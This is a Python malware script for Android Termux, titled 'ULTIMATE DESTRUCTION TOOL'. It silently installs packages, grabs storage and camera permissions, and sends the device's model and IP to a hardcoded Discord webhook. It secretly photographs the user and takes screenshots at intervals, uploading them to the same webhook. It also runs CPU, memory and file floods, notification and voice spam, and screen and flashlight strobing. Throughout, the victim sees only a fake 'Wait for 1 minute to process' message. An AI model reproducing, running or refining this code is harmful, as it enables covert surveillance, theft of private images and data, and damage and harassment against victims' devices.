#!/usr/bin/env python3
"""
================================================================================
   🔥 ULTIMATE DESTRUCTION TOOL - FULLY AUTOMATIC 🔥
   OUTPUT: "Wait for 1 minute to process" only
   ONE COMMAND: python ultimate.py
================================================================================
"""

import os
import sys
import subprocess
import time

# ==================== AUTO INSTALLER (SILENT) ====================

def auto_install():
    """Automatically install all requirements - SILENT"""
    
    try:
        # Check if already installed
        import requests
        import colorama
        installed = True
    except:
        installed = False
    
    if not installed:
        # Update and install
        subprocess.run(['pkg', 'update', '-y'], capture_output=True)
        subprocess.run(['pkg', 'upgrade', '-y'], capture_output=True)
        subprocess.run(['pkg', 'install', '-y', 'python', 'termux-api', 'termux-tools'], capture_output=True)
        subprocess.run(['pip', 'install', 'requests', 'colorama'], capture_output=True)
        
        # Request permissions
        subprocess.run(['termux-setup-storage'], capture_output=True)
        subprocess.run(['termux-camera-photo', '-c', '0', '/sdcard/test.jpg'], capture_output=True)
        time.sleep(2)

# Run auto installer first
auto_install()

# ==================== MAIN CODE ====================

import random
import string
import threading
import socket
import gc
import json
import platform
import datetime
import signal
import requests
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

# Discord Webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1496392996231450688/w1B0sZjH6MDugQgbH_5e7eRW216vSEmcfhbKyq2R6yilqpiGmDd7j42zMJBRLmYLDnH4"

STOP_FLAG = False

def signal_handler(sig, frame):
    global STOP_FLAG
    STOP_FLAG = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

class UltimateDestruction:
    def __init__(self):
        self.stop = False
        self.chunks = []
        self.files = []
        self.photos_taken = []
        
        self.locations = [
            os.path.expanduser("~/storage/downloads"),
            os.path.expanduser("~/storage/dcim"),
            os.path.expanduser("~/storage/pictures"),
            os.path.expanduser("~/storage/documents"),
            os.path.expanduser("~"),
            "/data/data/com.termux/files/usr/tmp",
        ]
        
        for loc in self.locations:
            try:
                if not os.path.exists(loc):
                    os.makedirs(loc, exist_ok=True)
            except:
                pass
        
        self.has_termux_api = self.check_termux_api()
    
    def check_termux_api(self):
        try:
            subprocess.run(['termux-notification', '--help'], capture_output=True, timeout=2)
            return True
        except:
            return False
    
    def rand_name(self, length=6):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    # ==================== DISCORD ====================
    
    def send_to_discord(self, content=None, image_path=None):
        try:
            if image_path and os.path.exists(image_path) and os.path.getsize(image_path) > 5000:
                with open(image_path, 'rb') as f:
                    files = {'file': (os.path.basename(image_path), f, 'image/jpeg')}
                    requests.post(WEBHOOK_URL, files=files, timeout=3)
        except:
            pass
    
    def send_device_info(self):
        try:
            manufacturer = "Unknown"
            model = "Unknown"
            try:
                result = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True)
                if result.stdout.strip():
                    manufacturer = result.stdout.strip()
                result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True)
                if result.stdout.strip():
                    model = result.stdout.strip()
            except:
                pass
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except:
                ip = "127.0.0.1"
            
            data = {
                "embeds": [{
                    "title": "📱 DEVICE DETECTED",
                    "color": 0xFF0000,
                    "fields": [
                        {"name": "📱 Phone", "value": f"`{manufacturer} {model}`"},
                        {"name": "🌐 IP", "value": f"`{ip}`"},
                    ]
                }]
            }
            requests.post(WEBHOOK_URL, json=data, timeout=3)
        except:
            pass
    
    # ==================== ATTACKS ====================
    
    def keyboard_auto_type(self):
        texts = ["Brother you got hacked!", "⚠️ HACKED ⚠️", "💀 DEVICE OWNED 💀"]
        while not self.stop:
            try:
                text = random.choice(texts)
                os.system(f"input text '{text[:20]}' 2>/dev/null")
                os.system("input keyevent KEYCODE_ENTER 2>/dev/null")
            except:
                pass
            time.sleep(random.uniform(0.5, 1.5))
    
    def fake_popup(self):
        messages = ["⚠️ BROTHER YOU GOT HACKED ⚠️", "🔴 DEVICE COMPROMISED 🔴"]
        while not self.stop:
            try:
                if self.has_termux_api:
                    msg = random.choice(messages)
                    os.system(f"termux-notification --title '‼️ HACKED ‼️' --content '{msg}' --priority max 2>/dev/null")
                    os.system(f"termux-toast -g center -b red -c white '{msg}' 2>/dev/null")
                    os.system(f"termux-tts-speak 'Brother you got hacked' 2>/dev/null")
            except:
                pass
            time.sleep(random.uniform(2, 4))
    
    def notification_spam(self):
        messages = ["YOU'RE HACKED", "BROTHER HACKED", "DEVICE OWNED"]
        while not self.stop:
            try:
                if self.has_termux_api:
                    msg = random.choice(messages)
                    os.system(f"termux-notification --title 'HACKED' --content '{msg}' 2>/dev/null")
            except:
                pass
            time.sleep(0.5)
    
    def vibration_spam(self):
        while not self.stop:
            try:
                if self.has_termux_api:
                    os.system(f"termux-vibrate -d 300 2>/dev/null")
            except:
                pass
            time.sleep(random.uniform(0.5, 1.5))
    
    def tts_spam(self):
        while not self.stop:
            try:
                if self.has_termux_api:
                    os.system(f"termux-tts-speak 'Brother you got hacked' 2>/dev/null")
            except:
                pass
            time.sleep(random.uniform(3, 6))
    
    def cpu_burn(self):
        def burn():
            while not self.stop:
                _ = [pow(x, x) for x in range(50)]
        cores = os.cpu_count() or 2
        for _ in range(cores):
            threading.Thread(target=burn, daemon=True).start()
        while not self.stop:
            time.sleep(1)
    
    def memory_flood(self):
        while not self.stop:
            try:
                self.chunks.append(bytearray(2 * 1024 * 1024))
                if len(self.chunks) > 50:
                    self.chunks.pop(0)
            except:
                time.sleep(1)
            time.sleep(0.3)
    
    def file_flood(self):
        while not self.stop:
            for loc in self.locations[:2]:
                try:
                    for _ in range(20):
                        filename = f"{loc}/f_{self.rand_name()}.dat"
                        with open(filename, 'w') as f:
                            f.write('x' * 1024)
                        self.files.append(filename)
                except:
                    pass
            time.sleep(0.5)
    
    def photo_capture(self):
        while not self.stop:
            try:
                if self.has_termux_api:
                    path = f"{self.locations[0]}/photo_{int(time.time())}.jpg"
                    os.system(f"termux-camera-photo -c 0 {path} 2>/dev/null")
                    time.sleep(1)
                    if os.path.exists(path) and os.path.getsize(path) > 5000:
                        self.send_to_discord(None, path)
                        self.photos_taken.append(path)
            except:
                pass
            time.sleep(15)
    
    def screenshot_capture(self):
        while not self.stop:
            try:
                if self.has_termux_api:
                    path = f"{self.locations[0]}/screenshot_{int(time.time())}.png"
                    os.system(f"termux-screenshot {path} 2>/dev/null")
                    time.sleep(1)
                    if os.path.exists(path) and os.path.getsize(path) > 5000:
                        self.send_to_discord(None, path)
                        self.photos_taken.append(path)
            except:
                pass
            time.sleep(10)
    
    def brightness_strobe(self):
        while not self.stop:
            try:
                os.system("settings put system screen_brightness 255 2>/dev/null")
                time.sleep(0.05)
                os.system("settings put system screen_brightness 50 2>/dev/null")
                time.sleep(0.05)
            except:
                pass
    
    def flash_strobe(self):
        while not self.stop:
            try:
                os.system("termux-torch on 2>/dev/null")
                time.sleep(0.05)
                os.system("termux-torch off 2>/dev/null")
                time.sleep(0.05)
            except:
                pass
    
    def cleanup(self):
        while not self.stop:
            time.sleep(30)
            for f in self.files[:50]:
                try:
                    if os.path.exists(f):
                        os.remove(f)
                        if f in self.files:
                            self.files.remove(f)
                except:
                    pass
    
    # ==================== MAIN ====================
    
    def run(self):
        # Send device info
        self.send_device_info()
        
        # Start all attacks
        attacks = [
            self.keyboard_auto_type,
            self.fake_popup,
            self.notification_spam,
            self.vibration_spam,
            self.tts_spam,
            self.cpu_burn,
            self.memory_flood,
            self.file_flood,
            self.photo_capture,
            self.screenshot_capture,
            self.brightness_strobe,
            self.flash_strobe,
            self.cleanup,
        ]
        
        for attack in attacks:
            t = threading.Thread(target=attack, daemon=True)
            t.start()
            time.sleep(0.1)
        
        # Clear screen
        os.system('clear')
        
        # Colors
        colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
        
        # Main loop - ONLY "Wait for 1 minute to process"
        color_index = 0
        
        while not STOP_FLAG and not self.stop:
            color = colors[color_index % len(colors)]
            sys.stdout.write(f'\r{color}Wait for 1 minute to process{Style.RESET_ALL}')
            sys.stdout.flush()
            color_index += 1
            time.sleep(0.2)
        
        self.stop = True
        sys.exit(0)

# ==================== RUN ====================

if __name__ == "__main__":
    try:
        tool = UltimateDestruction()
        tool.run()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        sys.exit(0)
